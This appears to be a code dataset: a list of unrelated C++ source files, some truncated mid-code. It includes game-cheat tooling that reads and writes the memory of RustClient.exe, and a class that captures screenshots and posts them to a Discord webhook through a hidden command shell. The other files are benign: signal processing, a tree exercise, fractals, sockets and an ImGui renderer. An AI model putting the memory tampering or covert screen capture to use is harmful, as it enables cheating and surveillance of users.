    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass TextStyle-Base-XXS-Red.TextStyle-Base-XXS-Red_C\n// (None)\n\nclass UClass* UTextStyleMinusBaseMinusXXSMinusRed_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"TextStyle-Base-XXS-Red_C\");\n\n\treturn Clss;\n}\n\n\n// TextStyle-Base-XXS-Red_C TextStyle-Base-XXS-Red.Default__TextStyle-Base-XXS-Red_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass UTextStyleMinusBaseMinusXXSMinusRed_C* UTextStyleMinusBaseMinusXXSMinusRed_C::GetDefaultObj()\n{\n\tstatic class UTextStyleMinusBaseMinusXXSMinusRed_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UTextStyleMinusBaseMinusXXSMinusRed_C*>(UTextStyleMinusBaseMinusXXSMinusRed_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n}\n\n\n",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/tagged_stream_to_pdu.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <complex>\n#include <numeric>\n\nint main()\n{\n    using namespace boost::ut;\n\n    gr::Graph fg;\n\n    std::vector<int> v(30);\n    std::iota(v.begin(), v.end(), 0);\n    const std::vector<gr::Tag> tags = { { 0, { { \"packet_len\", 10 } } },\n                                        { 3, { { \"foo\", \"bar\" } } },\n                                        { 10, { { \"packet_len\", 20 } } } };\n    auto& source = fg.emplaceBlock<gr::packet_modem::VectorSource<int>>(v, false, tags);\n    auto& stream_to_pdu = fg.emplaceBlock<gr::packet_modem::TaggedStreamToPdu<int>>();\n    auto& sink =\n        fg.emplaceBlock<gr::packet_modem::VectorSink<gr::packet_modem::Pdu<int>>>();\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(source).to<\"in\">(stream_to_pdu)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(stream_to_pdu).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    const auto data = sink.data();\n    std::print(\"vector sink contains {} items\\n\", data.size());\n    std::print(\"vector sink items:\\n\");\n    for (const auto& pdu : data) {\n        fmt::println(\"data = {}\", pdu.data);\n        fmt::println(\"tags:\");\n        for (const auto& t : pdu.tags) {\n            fmt::println(\"index = {}, map = {}\", t.index, t.map);\n        }\n    }\n    std::print(\"\\n\");\n    std::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
    "#include <Windows.h>\n#include <winternl.h>\n#include <Psapi.h>\n\n#ifdef _DEBUG\n#include \"usermode.h\"\nbool p9::memory::setup( ) {\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );\n\tif ( ss ) {\n\t\tHANDLE process = NULL;\n\t\tPROCESSENTRY32 pe;\n\t\tpe.dwSize = sizeof( PROCESSENTRY32 );\n\t\tif ( Process32First( ss, &pe ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {\n\t\t\t\t\tprocess = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );\n\t\t\t\t}\n\t\t\t} while ( Process32Next( ss, &pe ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t\tprocess_handle = process;\n\t}\n\treturn process_handle;\n}\n\nvoid p9::memory::read( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tReadProcessMemory( process_handle, ( LPCVOID )address, buffer, size, 0 );\n}\n\nvoid p9::memory::write( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tWriteProcessMemory( process_handle, ( LPVOID )address, &buffer, size, NULL );\n}\n\np9::memory::module_t p9::memory::get_module( const std::wstring& name ) {\n\n\tmodule_t mod = { 0 };\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId( process_handle ) );\n\tif ( ss ) {\n\t\tMODULEENTRY32 me;\n\t\tme.dwSize = sizeof( MODULEENTRY32 );\n\t\tif ( Module32First( ss, &me ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( me.szModule, name.data( ) ) ) {\n\t\t\t\t\tmod.base = ( uint64_t )me.modBaseAddr;\n\t\t\t\t\tmod.size = ( uint64_t )me.modBaseSize;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} while ( Module32Next( ss, &me ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t}\n\treturn mod;\n}\n#endif // _DEBUG",
    "#include \"webhook.h\"\n\n#include <vector>\n#include <opencv2/opencv.hpp>\n#include <atlimage.h> // for CImage\n#include <fstream>\n\nusing namespace std::literals;\n\nDiscordWebhook::DiscordWebhook() {\n\n    std::ifstream input;\n    input.open(webhook_path_);\n    if (!input.is_open()) {\n        std::cout << webhook_path_ << \" file was not created or opened\"s << std::endl;\n        return;\n    }\n    \n    std::string line;\n    std::size_t counter = 0;\n    while (std::getline(input, line)) {\n        \n        if (counter == 1) {\n            webhook_path_ = line;\n            input.close();\n            return;\n        }\n        ++counter;\n    }\n    input.close();\n}\n\nDiscordWebhook::DiscordWebhook(std::string webhook_path) : webhook_path_(webhook_path) {}\n\nvoid DiscordWebhook::SendImage(int x, int y, int width, int height,const std::string& image_path){\n\n    HBITMAP h_bitmap = CaptureScreenshotForWebhook(x, y, width, height);\n    std::vector<BYTE> buf;\n    IStream* stream = NULL;\n    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);\n    CImage image;\n    image.Attach(h_bitmap);\n    image.Save(stream, Gdiplus::ImageFormatPNG);\n    ULARGE_INTEGER liSize;\n    IStream_Size(stream, &liSize);\n    DWORD len = liSize.LowPart;\n    IStream_Reset(stream);\n    buf.resize(len);\n    IStream_Read(stream, &buf[0], len);\n    stream->Release();\n    std::fstream fi;\n    fi.open(image_path, std::fstream::binary | std::fstream::out);\n    fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));\n    fi.close();\n\n    // \u00ce\u00f2\u00ef\u00f0\u00e0\u00e2\u00ea\u00e0 \u00e8\u00e7\u00ee\u00e1\u00f0\u00e0\u00e6\u00e5\u00ed\u00e8\u00ff \u00e2 Discord \u00f7\u00e5\u00f0\u00e5\u00e7 \u00e2\u00e5\u00e1\u00f5\u00f3\u00ea\n    // Send an image to Discord via webhook\n    const std::string command = cmd_for_image_message_ + image_path + \"\\\" \" + GetWebHookUrl() + \" > NUL\";\n    system(command.c_str());\n\n    DeleteObject(h_bitmap); // \u00ce\u00f1\u00e2\u00ee\u00e1\u00ee\u00e6\u00e4\u00e5\u00ed\u00e8\u00e5 \u00f0\u00e5\u00f1\u00f3\u00f0\u00f1\u00ee\u00e2 \u00e1\u00e8\u00f2\u00ec\u00e0\u00ef\u00e0  || Freeing up bitmap resources\n}\n\nint DiscordWebhook::system_no_output(std::string command) noexcept{\n    command.insert(0, \"/C \");\n\n    SHELLEXECUTEINFOA sh_exec_info = { 0 };\n    sh_exec_info.cbSize = sizeof(SHELLEXECUTEINFO);\n    sh_exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;\n    sh_exec_info.hwnd = NULL;\n    sh_exec_info.lpVerb = NULL;\n    sh_exec_info.lpFile = \"cmd.exe\";\n    sh_exec_info.lpParameters = command.c_str();\n    sh_exec_info.lpDirectory = NULL;\n    sh_exec_info.nShow = SW_HIDE;\n    sh_exec_info.hInstApp = NULL;\n\n    if (ShellExecuteExA(&sh_exec_info) == FALSE) {\n        return -1;\n    }\n    if (sh_exec_info.hProcess != nullptr) {\n        WaitForSingleObject(sh_exec_info.hProcess, INFINITE);\n        DWORD rv;\n        GetExitCodeProcess(sh_exec_info.hProcess, &rv);\n        CloseHandle(sh_exec_info.hProcess);\n        return rv;\n    }\n    else {\n        return -1;\n    }\n}\n\nstd::string DiscordWebhook::GetWebHookUrl() const{\n    return webhook_path_;\n}\n\nvoid DiscordWebhook::SendText(std::string message) {\n    std::string command = cmd_1_for_text_message_ + message + cmd_2_for_text_message_ + GetWebHookUrl();\n    system_no_output(command.c_str());\n}\n\n",
    "#include <iostream>\r\nusing namespace std;\r\nstruct ver {\r\n int data;\r\n ver *left, *right;\r\n};\r\nclass tree {\r\npublic:\r\n ver* create(int, ver*);\r\n void in(ver*);\r\n void post(ver*);\r\n void pre(ver*);\r\n};\r\nver* tree::create(int c, ver* node) {\r\n if (node == NULL) {\r\n node = new ver;\r\n node->data = c;\r\n node->left = NULL;\r\n node->right = NULL;\r\n return node;\r\n }\r\n else {\r\n if (c < node->data)\r\n node->left = create(c, node->left);\r\n else\r\n node->right = create(c, node->right);\r\n return node;\r\n }\r\n}\r\nvoid tree::in(ver* node) {\r\n if (node) {\r\n in(node->left);\r\n cout << node->data << \"\\t\";\r\n in(node->right);\r\n }\r\n}\r\nvoid tree::pre(ver* node) {\r\n if (node) {\r\n cout << node->data << \"\\t\";\r\n pre(node->left);\r\n pre(node->right);\r\n }\r\n}\r\nvoid tree::post(ver* node) {\r\n if (node) {\r\n post(node->left);\r\n post(node->right);\r\n cout << node->data << \"\\t\";\r\n }\r\n}\r\nint main() {\r\n tree t;\r\n ver* r = NULL;\r\n int n, ch;\r\n cout << \"\\n 1: Insert 2: Inorder 3: Preorder 4: Postorder 5: Exit :\\n\";\r\n while (ch != 5) {\r\n cout << \"\\nEnter Choice:\";\r\n cin >> ch;\r\n switch (ch) {\r\n case 1:\r\n cout << \"\\nEnter Node:\";\r\n cin >> n;\r\n r = t.create(n, r);\r\n break;\r\n case 2:\r\n cout << \"\\nInorder Traversal:\";\r\n t.in(r);\r\n break;\r\n case 3:\r\n cout << \"\\nPreorder Traversal:\";\r\n t.pre(r);\r\n break;\r\n case 4:\r\n cout << \"\\nPostorder Traversal:\";\r\n t.post(r);\r\n break;\r\n case 5:\r\n return 0;\r\n }\r\n }\r\n}\r\n",
    "\ufeff#include <SFML/Graphics.hpp>\r\n#include <ccomplex>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <atlstr.h>\r\n#include <random>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace sf;\r\n\r\nstd::complex<double> mandelbrot(std::complex<double> z, std::complex<double> c)\r\n{\r\n    \r\n    std::complex<double> z1(0, 0);\r\n    z1 = z * z + c;\r\n\r\n\r\n\r\n    return z1;\r\n}\r\n\r\n\r\nint IsM(std::complex<double> c, int mx)\r\n{\r\n    std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nint IsJ(std::complex<double> z, int mx, std::complex<double> c)\r\n{\r\n    std::complex<double> f(-0.7514f, -0.826f);\r\n    //std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nvoid update(int WIDTH, int HEIGHT, double ofX, double ofY, RenderWindow& window, RectangleShape shape, double scale, int maxIt, int Fnum, std::complex<double> cForJ)\r\n{\r\n\r\n    window.clear();\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2 + ofX) * scale;\r\n            double y = (j - HEIGHT / 2 + ofY) * scale;\r\n\r\n            y = -y;\r\n            if (Fnum==0)\r\n            {\r\n                Uint8 clr = IsM(std::complex<double>(x, y), maxIt);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n            else if(Fnum == 1)\r\n            {\r\n                Uint8 clr = IsJ(std::complex<double>(x, y), maxIt, cForJ);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n\r\n\r\n            \r\n            /*if (IsM(std::complex<double>(x, y), 100))\r\n            {\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }*/\r\n        }\r\n    }\r\n\r\n\r\n    window.display();\r\n}\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    int MaxIt = 50;\r\n    bool start = true;\r\n    int m = 0;\r\n    \r\n    std::complex<double> cForJ(-0.64, 0.39);\r\n    if (start)\r\n    {\r\n        std::cout << \"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u043e\u0432\\n\";\r\n        std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0443\u043c \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439 (\u043c\u0435\u043d\u044c\u0448\u0435 - \u043b\u0443\u0447\u0448\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043d\u043e \u0445\u0443\u0436\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c \u0438 \u044f\u0440\u0447\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442): \";\r\n        std::cin >> MaxIt;\r\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u044b:\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u041c\u043e\u043d\u0434\u0435\u043b\u044c\u0431\u0440\u043e\u0442\u0430: 0\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0416\u044e\u043b\u0438\u0430: 1\\n\";\r\n        std::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e: \";\r\n        std::cin >> m;\r\n        std::cout << \"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\\n\u0421\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438: \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Shift: \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Alt: \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u0435\\nU: \u043e\u0431\u043d\u043e\u0432\u0438\u0442\u044c \u044d\u043a\u0440\u0430\u043d\\n\";\r\n        std::cout << \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0441\u0434\u0435\u043b\u0430\u043d\u0430 \u0432 \u0440\u0430\u043c\u043a\u0430\u0445 \u043f\u0440\u043e\u0435\u043a\u0442\u043d\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\\n\u0428\u043a\u043e\u043b\u0430 \u21161580, 2024 \u0433.\";\r\n        \r\n        \r\n    }\r\n    std::complex<double> z(0, 0);\r\n    std::int32_t WIDTH = 200;\r\n    std::int32_t HEIGHT = 200;\r\n    double Y=0;\r\n    double X=0;\r\n\r\n    double ofX = 0;\r\n    double ofY = 0;\r\n    double scale = 0.01f;\r\n    RenderWindow window(VideoMode(WIDTH, HEIGHT), L\"\u0424\u0440\u0430\u043a\u0442\u0430\u043b\", Style::Default);\r\n    RenderWindow test(VideoMode(WIDTH, HEIGHT), L\"\u0412\u044b\u0431\u043e\u0440 \u0442\u043e\u0447\u043a\u0438\", Style::Titlebar);\r\n    \r\n    Vector2i pos = window.getPosition();\r\n    pos.x += WIDTH;\r\n\r\n    test.setPosition(pos);\r\n    \r\n    if (m!=1) \r\n    {\r\n        test.close();             \r\n    }\r\n    \r\n\r\n    window.setVerticalSyncEnabled(true);\r\n    \r\n\r\n    CircleShape sh;\r\n    sh.setScale({ 1.f,1.f });\r\n    sh.setRadius(0.5f);\r\n    sh.setFillColor(Color::Black);\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2)/50;\r\n            double y = (j - HEIGHT / 2)/50;\r\n\r\n            y = -y;\r\n            \r\n            Uint8 c = IsM(std::complex<double>(x,y),MaxIt)/2;\r\n            auto GREY = Color{c, c, c };\r\n            sh.setFillColor(GREY);\r\n            sh.setPosition(i, j);\r\n            test.draw(sh);\r\n            sh.setFillColor(Color::Black);\r\n            if (i == WIDTH/2 || j == HEIGHT/2)\r\n            {\r\n                sh.setFillColor(Color::White);\r\n                sh.setPosition(i, j);\r\n                test.draw(sh);\r\n                \r\n            }\r\n\r\n        }\r\n    }\r\n    test.display();\r\n\r\n\r\n    RectangleShape shape;\r\n    shape.setSize({ 1.f, 1.f });\r\n    shape.setFillColor(Color::White);\r\n\r\n    \r\n\r\n\r\n    update(WIDTH, HEIGHT, ofX, ofY, window, shape, scale, MaxIt, m, cForJ);\r\n    while (window.isOpen())\r\n    {\r\n        if (window.hasFocus())\r\n        {\r\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\r\n            {\r\n                ofX -= 50;\r\n                update(W",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#include <iostream>\n#include <string>\n#include <tchar.h>\n#include <time.h>\n#include \"Winsock2.h\" // \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a WS2_32.dll\n#include <map>\n#pragma comment(lib, \"WS2_32.lib\") // \u044d\u043a\u0441\u043f\u043e\u0440\u0442 WS2_32.dll\nusing namespace std;\nstruct CA\n{\n\tchar ipaddr[15];\n\tchar resurce[20];\n\tint number;\n\tenum Status\n\t{\n\t\tNOINIT,\n\t\tINIT,\n\t\tENTER,\n\t\tLEAVE,\n\t\tWAIT\n\t} status;\n};\nstring GetErrorMsgText(int code) // c\u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0442\u0435\u043a\u0441\u0442 \u043e\u0448\u0438\u0431\u043a\u0438\n{\n\tstring msgText;\n\tswitch (code) // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043a\u043e\u0434\u0430 \u0432\u043e\u0437\u0432\u0440\u0430\u0442\u0430\n\t{\n\tcase WSAEINTR: msgText = \"WSAEINTR\"; break;\n\tcase WSAEACCES: msgText = \"WSAEACCES\"; break;\n\tcase WSAEFAULT: msgText = \"WSAEFAULT\"; break;\n\tcase WSAEINVAL: msgText = \"WSAEINVAL\"; break;\n\tcase WSAEMFILE: msgText = \"WSAEMFILE\"; break;\n\tcase WSAEWOULDBLOCK: msgText = \"WSAEWOULDBLOCK\"; break;\n\tcase WSAEINPROGRESS: msgText = \"WSAEINPROGRESS\"; break;\n\tcase WSAEALREADY: msgText = \"WSAEALREADY\"; break;\n\tcase WSAENOTSOCK: msgText = \"WSAENOTSOCK\"; break;\n\tcase WSAEDESTADDRREQ: msgText = \"WSAEDESTADDRREQ\"; break;\n\tcase WSAEMSGSIZE: msgText = \"WSAEMSGSIZE\"; break;\n\tcase WSAEPROTOTYPE: msgText = \"WSAEPROTOTYPE\"; break;\n\tcase WSAENOPROTOOPT: msgText = \"WSAENOPROTOOPT\"; break;\n\tcase WSAEPROTONOSUPPORT: msgText = \"WSAEPROTONOSUPPORT\"; break;\n\tcase WSAESOCKTNOSUPPORT: msgText = \"WSAESOCKTNOSUPPORT\"; break;\n\tcase WSAEOPNOTSUPP: msgText = \"WSAEOPNOTSUPP\"; break;\n\tcase WSAEPFNOSUPPORT: msgText = \"WSAEPFNOSUPPORT\"; break;\n\tcase WSAEAFNOSUPPORT: msgText = \"WSAEAFNOSUPPORT\"; break;\n\tcase WSAEADDRINUSE: msgText = \"WSAEADDRINUSE\"; break;\n\tcase WSAEADDRNOTAVAIL: msgText = \"WSAEADDRNOTAVAIL\"; break;\n\tcase WSAENETDOWN: msgText = \"WSAENETDOWN\"; break;\n\tcase WSAENETUNREACH: msgText = \"WSAENETUNREACH\"; break;\n\tcase WSAENETRESET: msgText = \"WSAENETRESET\"; break;\n\tcase WSAECONNABORTED: msgText = \"WSAECONNABORTED\"; break;\n\tcase WSAECONNRESET: msgText = \"WSAECONNRESET\"; break;\n\tcase WSAENOBUFS: msgText = \"WSAENOBUFS\"; break;\n\tcase WSAEISCONN: msgText = \"WSAEISCONN\"; break;\n\tcase WSAENOTCONN: msgText = \"WSAENOTCONN\"; break;\n\tcase WSAESHUTDOWN: msgText = \"WSAESHUTDOWN\"; break;\n\tcase WSAETIMEDOUT: msgText = \"WSAETIMEDOUT\"; break;\n\tcase WSAECONNREFUSED: msgText = \"WSAECONNREFUSED\"; break;\n\tcase WSAEHOSTDOWN: msgText = \"WSAEHOSTDOWN\"; break;\n\tcase WSAEHOSTUNREACH: msgText = \"WSAEHOSTUNREACH\"; break;\n\tcase WSAEPROCLIM: msgText = \"WSAEPROCLIM\"; break;\n\tcase WSASYSNOTREADY: msgText = \"WSASYSNOTREADY\"; break;\n\tcase WSAVERNOTSUPPORTED: msgText = \"WSAVERNOTSUPPORTED\"; break;\n\tcase WSANOTINITIALISED: msgText = \"WSANOTINITIALISED\"; break;\n\tcase WSAEDISCON: msgText = \"WSAEDISCON\"; break;\n\tcase WSATYPE_NOT_FOUND: msgText = \"WSATYPE_NOT_FOUND\"; break;\n\tcase WSAHOST_NOT_FOUND: msgText = \"WSAHOST_NOT_FOUND\"; break;\n\tcase WSATRY_AGAIN: msgText = \"WSATRY_AGAIN\"; break;\n\tcase WSANO_RECOVERY: msgText = \"WSANO_RECOVERY\"; break;\n\tcase WSANO_DATA: msgText = \"WSANO_DATA\"; break;\n\tcase WSA_INVALID_HANDLE: msgText = \"WSA_INVALID_HANDLE\"; break;\n\tcase WSA_INVALID_PARAMETER: msgText = \"WSA_INVALID_PARAMETER\"; break;\n\tcase WSA_IO_INCOMPLETE: msgText = \"WSA_IO_INCOMPLETE\"; break;\n\tcase WSA_IO_PENDING: msgText = \"WSA_IO_PENDING\"; break;\n\tcase WSA_NOT_ENOUGH_MEMORY: msgText = \"WSA_NOT_ENOUGH_MEMORY\"; break;\n\tcase WSA_OPERATION_ABORTED: msgText = \"WSA_OPERATION_ABORTED\"; break;\n\t\t//..........\u043a\u043e\u0434\u044b WSAGetLastError ..........................\n\tcase WSASYSCALLFAILURE: msgText = \"WSASYSCALLFAILURE\"; break;\n\tdefault: msgText = \"***ERROR***\"; break;\n\t};\n\treturn msgText;\n};\nstring SetErrorMsgText(string msgText, int code)\n{\n\treturn msgText + GetErrorMsgText(code);\n};\nint _tmain(int argc, _TCHAR* argv[])\n{\n\tSOCKET sS;\n\tWSADATA wsaData;\n\tmap <char*,CA> map;\t\t//\u043a\u043b\u044e\u0447-\u0437\u043d\u0430\u0447\n\ttry\n\t{\n\t\tif (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)\n\t\t\tthrow SetErrorMsgText(\"Startup:\", WSAGetLastError());\n\t\tif ((sS = socket(AF_INET, SOCK_DGRAM, NULL)) == INVALID_SOCKET)\n\t\t\tthrow SetErrorMsgText(\"socket:\", WSAGetLastError());\n\t\tSOCKADDR_IN serv; // \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0441\u043e\u043a\u0435\u0442\u0430 sS\n\t\tserv.sin_family = AF_INET; // \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f IP-\u0430\u0434\u0440\u0435\u0441\u0430\u0446\u0438\u044f\n\t\tserv.sin_port = htons(2000); // \u043f\u043e\u0440\u0442 2000\n\t\tserv.sin_addr.s_addr = INADDR_ANY; // \u043b\u044e\u0431\u043e\u0439 \u0441\u043e\u0431\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 IP-\u0430\u0434\u0440\u0435\u0441\n\t\tif (bind(sS, (LPSOCKADDR)&serv, sizeof(serv)) == SOCKET_ERROR)\n\t\t\tthrow SetErrorMsgText(\"bind:\", WSAGetLastError());\n\t\twhile (true)\n\t\t{\n\t\t\tSOCKADDR_IN clnt; // \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0441\u043e\u043a\u0435\u0442\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\n\t\t\tmemset(&clnt, 0, sizeof(clnt)); // \u043e\u0431\u043d\u0443\u043b\u0438\u0442\u044c \u043f\u0430\u043c\u044f\u0442\u044c\n\t\t\tint lc = sizeof(clnt);\n\t\t\tint libuf = 0; //\u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0431\u0430\u0439\u0442\n\t\t\tCA ibuf; //\u0431\u0443\u0444\u0435\u0440 \u0432\u0432\u043e\u0434\u0430\n\t\t\tint lobuf = 0; //\u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 \u0431\u0430\u0439\u0442\n\t\t\tif ((libuf = recvfrom(sS, (char*)&ibuf, sizeof(ibuf), NULL, (sockaddr*)&clnt, &lc)) == SOCKET_ERROR)\n\t\t\t\tthrow SetErrorMsgText(\"recv:\", WSAGetLastError());\n\t\t\tif (ibuf.status == ibuf.ENTER || ibuf.status== ibuf.WAIT)\n\t\t\t{\n\t\t\t\tCA* s=NULL;\n\t\t\t\tif (!map.empty())\n\t\t\t\t{\n\t\t\t\t\ts = &((*(map.find(ibuf.resurce))).second);\n\t\t\t\t}\n\t\t\t\tif (s!=NULL)\n\t\t\t\t{\n\t\t\t\t\tibuf.status = ibuf.WAIT;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"Enter in Critical section \" <<ibuf.number << endl;\n\t\t\t\t\tmap",
    "// dear imgui: Renderer for DirectX11\n// This needs to be used along with a Platform Binding (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Support for large meshes (64k+ vertices) with 16-bit indices.\n\n// You can copy and use unmodified imgui_impl_* files in your project. See main.cpp for an example of using this.\n// If you are new to dear imgui, read examples/README.txt and read the documentation at the top of imgui.cpp\n// https://github.com/ocornut/imgui\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX data\nstatic ID3D11Device*            g_pd3dDevice = NULL;\nstatic ID3D11DeviceContext*     g_pd3dDeviceContext = NULL;\nstatic IDXGIFactory*            g_pFactory = NULL;\nstatic ID3D11Buffer*            g_pVB = NULL;\nstatic ID3D11Buffer*            g_pIB = NULL;\nstatic ID3D10Blob*              g_pVertexShaderBlob = NULL;\nstatic ID3D11VertexShader*      g_pVertexShader = 